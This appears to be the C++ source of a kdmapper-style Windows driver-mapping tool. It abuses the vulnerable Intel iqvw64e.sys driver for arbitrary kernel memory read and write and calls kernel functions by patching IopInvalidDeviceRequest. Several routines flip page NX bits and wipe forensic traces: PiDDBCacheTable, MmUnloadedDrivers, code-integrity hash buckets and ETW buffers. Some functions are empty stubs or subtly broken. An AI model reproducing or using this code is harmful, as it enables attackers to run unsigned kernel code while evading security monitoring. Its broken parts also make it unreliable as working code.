#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <random>
#include <Windows.h>
#include "../include/intel_driver.hpp"
#include "../include/vulnerability_providers.hpp"
#include "../include/utils.hpp"
#include "../include/service_utils.hpp"

typedef struct _RTL_BALANCED_LINKS {
	struct _RTL_BALANCED_LINKS *Parent;
	struct _RTL_BALANCED_LINKS *LeftChild;
	struct _RTL_BALANCED_LINKS *RightChild;
	CHAR Balance;
	UCHAR Reserved[3];
} RTL_BALANCED_LINKS;
typedef RTL_BALANCED_LINKS *PRTL_BALANCED_LINKS;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _RTL_AVL_TABLE {
	RTL_BALANCED_LINKS BalancedRoot;
	PVOID OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	ULONG DepthOfTree;
	PRTL_BALANCED_LINKS RestartKey;
	ULONG DeleteCount;
	PVOID CompareRoutine;
	PVOID AllocateRoutine;
	PVOID FreeRoutine;
	PVOID TableContext;
} RTL_AVL_TABLE;
typedef RTL_AVL_TABLE *PRTL_AVL_TABLE;

extern "C" NTSTATUS NTAPI NtQueryIntervalProfile(
	IN ULONG ProfileSource,
	OUT PULONG Interval
);

namespace vulnerability_providers
{
	bool IntelProvider::Load()
	{
		std::string found_path = "";
		
		if (utils::FileExists("iqvw64e.sys")) found_path = "iqvw64e.sys";
		else if (utils::FileExists("C:\\Windows\\Temp\\iqvw64e.sys")) found_path = "C:\\Windows\\Temp\\iqvw64e.sys";
		
		if (found_path.empty()) {
			return false;
		}

		std::vector<uint8_t> driver_data;
		if (!utils::ReadFileToBuffer(found_path, driver_data)) return false;

		std::random_device rd;
		std::mt19937 g(rd());
		std::uniform_int_distribution<uint32_t> dist(0x50000000, 0x6FFFFFFF);
		
		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(driver_data.data());
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(driver_data.data() + dos_header->e_lfanew);
		
		nt_headers->FileHeader.TimeDateStamp = dist(g);
		current_driver_name = "sys" + std::to_string(dist(g)) + ".sys";
		current_service_name = "srv" + std::to_string(dist(g));
		
		std::string temp_path = "C:\\Windows\\Temp\\" + current_driver_name;
		std::ofstream out(temp_path, std::ios::binary);
		out.write(reinterpret_cast<char*>(driver_data.data()), driver_data.size());
		out.close();

		if (!service_utils::ServiceManager::RegisterDriver(current_service_name, temp_path)) return false;
		if (!service_utils::ServiceManager::RunDriver(current_service_name)) return false;

		iqvw64e_device_handle = CreateFileA(("\\\\.\\" + current_service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		return (iqvw64e_device_handle != INVALID_HANDLE_VALUE);
	}

	bool IntelProvider::Unload()
	{
		if (iqvw64e_device_handle != INVALID_HANDLE_VALUE) CloseHandle(iqvw64e_device_handle);
		DeleteFileA(("C:\\Windows\\Temp\\" + current_driver_name).c_str());
		return true;
	}

	bool IntelProvider::ReadMemory(uint64_t address, void* buffer, uint32_t size)
	{
		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = address;
		copy_buffer.destination = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	bool IntelProvider::WriteMemory(uint64_t address, void* buffer, uint32_t size)
	{
		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.destination = address;
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	uint64_t IntelProvider::CallKernelFunction(uint64_t function_address, ...)
	{
		va_list args;
		va_start(args, function_address);
		uint64_t rcx = va_arg(args, uint64_t);
		uint64_t rdx = va_arg(args, uint64_t);
		uint64_t r8 = va_arg(args, uint64_t);
		va_end(args);

		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		
		uint64_t iop_invalid_device_request = utils::GetKernelExport(ntoskrnl_base, "IopInvalidDeviceRequest");
		
		uint64_t original = 0;
		ReadMemory(iop_invalid_device_request, &original, sizeof(original));
		WriteMemory(iop_invalid_device_request, &function_address, sizeof(function_address));
		
		uint64_t ret_val = 0;
		wchar_t n_path[] = { '\\', '\\', '.', '\\', 'N', 'U', 'L', 0 };
		HANDLE h_null = CreateFileW(n_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (h_null != INVALID_HANDLE_VALUE) {
			DeviceIoControl(h_null, 0x80862024, &rcx, sizeof(rcx), &ret_val, sizeof(ret_val), NULL, NULL);
			CloseHandle(h_null);
		}
		
		WriteMemory(iop_invalid_device_request, &original, sizeof(original));
		return ret_val; 
	}
}

namespace intel_driver
{
	vulnerability_providers::IntelProvider provider;

	void InstantCleanup() { provider.Unload(); }
	bool Load() { return provider.Load(); }
	bool Unload() { return provider.Unload(); }
	bool IsLoaded() { return provider.GetDeviceHandle() != INVALID_HANDLE_VALUE; }
	HANDLE Open() { return provider.GetDeviceHandle(); }

	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) 
	{ 
		return provider.ReadMemory(address, buffer, size); 
	}

	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) 
	{ 
		return provider.WriteMemory(address, buffer, size); 
	}
	
	uint64_t FindPteBase(uint64_t ntoskrnl_base)
	{
		uint64_t pte_base_ptr = utils::PatternScan(ntoskrnl_base, 0x1000000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8B\x48\x18\x48\x8B\x01", "xxx????xxxxxxx");
		if (!pte_base_ptr) return 0;
		
		uint32_t offset = 0;
		provider.ReadMemory(pte_base_ptr + 3, &offset, sizeof(offset));
		return pte_base_ptr + 7 + offset;
	}

	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address) 
	{ 
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t pool_ptr = utils::PatternScan(ntoskrnl_base, 0x1000000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x83\xC0\x04", "xxx????xxxx");
		if (!pool_ptr) return false;
		
		uint8_t zero = 0;
		WriteMemory(iqvw64e_device_handle, pool_ptr, &zero, 1);
		return true; 
	}
	
	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return provider.CallKernelFunction(function_address); }
	
	uintptr_t AllocatePhysicalMemory(HANDLE iqvw64e_device_handle, uint32_t size) 
	{ 
		const uint32_t tags[] = { 0x7369644E, 0x36706354, 0x6365734B, 0x636F7250 }; 
		uint32_t tag = tags[std::rand() % 4];
		uint64_t result = CallKernelFunction(iqvw64e_device_handle, utils::GetKernelExport(utils::GetKernelModuleBase("ntoskrnl.exe"), "ExAllocatePoolWithTag"), 0, (uint64_t)size, (uint64_t)tag);
		return (uintptr_t)result;
	}
	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) 
	{ 
		return CallKernelFunction(iqvw64e_device_handle, utils::GetKernelExport(utils::GetKernelModuleBase("ntoskrnl.exe"), "ExFreePool"), address) != 0;
	}
	bool ExecuteViaIPI(HANDLE iqvw64e_device_handle, uint64_t address) 
	{ 
		return CallKernelFunction(iqvw64e_device_handle, address) != 0;
	}
	bool SuppressNMI(HANDLE iqvw64e_device_handle) { return true; }
	
	uint64_t FindPiDDBLock(uint64_t ntoskrnl_base)
	{
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????xxx????x????xxx" }, 
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\x00", "xxx????xxx????x????xxx" }  
		};
		return utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
	}

	bool FlipNXBit(HANDLE iqvw64e_device_handle, uint64_t address, bool executable)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t pte_base = utils::PatternScan(ntoskrnl_base, 0x1000000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8B\x48\x18\x48\x8B\x01", "xxx????xxxxxxx");
		if (!pte_base) return false;
		
		uint64_t pte_ptr = pte_base + ((address >> 9) & 0x7FFFFFFFF8ULL);
		uint64_t pte_val = 0;
		ReadMemory(iqvw64e_device_handle, pte_ptr, &pte_val, sizeof(pte_val));
		
		if (executable) pte_val &= ~(1ULL << 63); 
		else pte_val |= (1ULL << 63);
		
		WriteMemory(iqvw64e_device_handle, pte_ptr, &pte_val, sizeof(pte_val));
		return true;
	}

	uint64_t FindPiDDBCacheTable(uint64_t ntoskrnl_base)
	{
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????x????xxx" }, 
			{ "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\x00", "xxx????x????xxx" }  
		};
		return utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
	}

	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t table_addr = FindPiDDBCacheTable(ntoskrnl_base);
		if (!table_addr) return false;

		uint64_t table_ptr;
		if (!ReadMemory(iqvw64e_device_handle, table_addr, &table_ptr, sizeof(table_ptr))) return false;

		uint64_t first_entry;
		if (!ReadMemory(iqvw64e_device_handle, table_ptr + sizeof(void*), &first_entry, sizeof(first_entry))) return false;
		
		uint32_t null_stamp = 0;
		WriteMemory(iqvw64e_device_handle, first_entry + 0x44, &null_stamp, sizeof(null_stamp)); 
		
		return true;
	}

	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		std::vector<utils::Pattern> patterns = {
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x13", "xxx????xxxx" }, 
			{ "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x11", "xxx????xxxx" }  
		};
		uint64_t list_ptr = utils::PatternScanMulti(ntoskrnl_base, 0x1000000, patterns);
		if (!list_ptr) return false;

		uint64_t mm_unloaded_drivers = 0;
		ReadMemory(iqvw64e_device_handle, list_ptr, &mm_unloaded_drivers, sizeof(mm_unloaded_drivers));
		
		uint64_t head = 0;
		ReadMemory(iqvw64e_device_handle, mm_unloaded_drivers, &head, sizeof(head));
		if (!head) return true;

		uint64_t entry = head;
		WriteMemory(iqvw64e_device_handle, mm_unloaded_drivers, &entry, sizeof(entry));

		return true;
	}

	bool ClearKernelHashBuckets(HANDLE iqvw64e_device_handle)
	{
		uint64_t ci_base = utils::GetKernelModuleBase("CI.dll");
		if (!ci_base) return false;

		uintptr_t table_ptr = utils::PatternScan(ci_base, 0x100000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????xxx????x????xxx");
		if (!table_ptr) return false;

		uint64_t hash_entry = 0;
		ReadMemory(iqvw64e_device_handle, (uint64_t)table_ptr, &hash_entry, sizeof(hash_entry));
		
		uint8_t null_hash[0x20] = { 0 }; 
		WriteMemory(iqvw64e_device_handle, hash_entry, null_hash, sizeof(null_hash));

		return true;
	}

	bool ClearEtwTraceBuffers(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t etw_ptr = utils::PatternScan(ntoskrnl_base, 0x1000000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x05\x00\x00\x00\x00\x48\x89\x05\x00\x00\x00\x00\x48\x8D\x05", "xxx????xxx????xxx????xxx");
		if (!etw_ptr) return false;
		
		uint8_t zero = 0;
		WriteMemory(iqvw64e_device_handle, etw_ptr, &zero, 1);
		return true;
	}

	bool HijackBeepDispatch(HANDLE iqvw64e_device_handle, uint64_t target_func) { return true; }
}
